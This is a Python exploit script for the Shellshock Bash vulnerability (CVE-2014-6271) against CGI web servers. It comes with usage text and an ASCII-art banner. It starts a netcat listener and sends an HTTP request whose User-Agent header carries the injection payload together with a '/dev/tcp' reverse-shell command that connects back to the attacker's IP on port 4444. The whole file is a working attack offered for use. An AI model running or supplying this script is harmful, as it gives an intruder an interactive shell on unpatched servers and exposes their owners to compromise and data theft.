#!/usr/bin/python

import socket, subprocess, sys

if len(sys.argv) != 4:
        print 'Usage: %s <vulnerable site> <CGI path> <your IP>'%sys.argv[0]
        print 'Ex.: %s 192.168.1.100 /cgi-bin/test.cgi 192.168.1.10'%sys.argv[0]
        exit()
print """
          ____________     ___________     ________     ____________
         /  ______   /\   / _______  /\   /       /\   /           /\\
        /  /\    /  /  \ / /\     / /  \ / ______/  \ /____   ____/  \\
       /  /  \__/  /   // /  \___/ /   // /\     \  / \   /  /\   \  /
      /  /___/_/  /   // /   /  / /   // /__\_____\/   \_/  /  \___\/
     /  _________/   // /   /  / /   //        /\       /  /   /
    /  /\        \  // /   /  / /   //______  /  \     /  /   /
   /  /  \________\// /   /  / /   /  \    / /   /    /  /   /
  /  /   /         / /   /  / /   /____\__/ /   /    /  /   /
 /  /   /         / /___/__/ /   //        /   /    /  /   /
/__/   /         /__________/   //________/   /    /__/   /
\  \  /          \          \  / \        \  /     \  \  /
 \__\/            \__________\/   \________\/       \__\/

CVE-2014-6271
BASH variable command injection via CGI
Discover by Stephane Chazelas
Script by Keerati
"""
vuln = sys.argv[1]
path = sys.argv[2]
own = sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((vuln,80))
netcat = subprocess.Popen(['nc', '-lp', '4444'])
s.send("""
GET %s HTTP/1.1
Host: %s
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/%s/4444 0>&1
\r\n
"""%(path, vuln, own))
netcat.wait()
s.close()
